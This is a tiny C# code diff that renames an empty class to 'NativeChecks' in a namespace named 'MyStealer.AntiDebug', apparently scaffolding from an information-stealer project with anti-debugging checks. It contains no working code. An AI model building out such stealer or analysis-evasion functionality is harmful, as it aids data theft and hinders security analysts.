@@ -1,6 +1,6 @@
 ﻿namespace MyStealer.AntiDebug
 {
-    public class Class1
+    internal class NativeChecks
     {
     }
 }
